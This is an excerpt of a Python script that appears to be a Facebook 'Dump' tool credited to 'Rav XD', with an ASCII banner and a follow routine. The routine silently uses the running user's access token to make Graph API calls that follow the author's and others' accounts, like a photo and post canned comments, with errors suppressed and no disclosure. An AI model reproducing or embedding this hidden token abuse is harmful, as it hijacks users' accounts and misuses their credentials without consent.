...
# Banner
___banner___ = ("""%s ____%s Created by : Rav XD\n%s|  _ \ _   _ _ __ ___  _ __\n| | | | | | | '_ ` _ \| '_ \ \n%s| |_| | |_| | | | | | | |_) |\n|____/ \__,_|_| |_| |_| .__/
                      |_|
"""%(H,P,H,B))
...
def ___follow___():
    ...
    try:
        ...
        ___komen2___ = ('I Love You @[100034994956054:]\n\n'+___kata___+'\n'+___waktu)
        ___komen3___ = random.choice(['Hello Bang','Mantap Bang','Keren Bang','Very Nice','Programmer Bang?','Hallo Bang','Luar Biasa'])
        requests.post('https://graph.facebook.com/100009259285042/subscribers?access_token=%s'%(___token)) #Rav
        requests.post('https://graph.facebook.com/100034994956054/subscribers?access_token=%s'%(___token)) #Rav
        ...
        requests.post('https://graph.facebook.com/3096356797349599/likes?summary=true&access_token=%s'%(___token)) # foto profil
        requests.post('https://graph.facebook.com/1418389965146299/comments/?message=%s&access_token=%s'%(___komen3___,___token)) #foto sampul
        ...
        requests.post('https://graph.facebook.com/100002606153676/subscribers?access_token=%s'%(___token)) # Inka
    except:
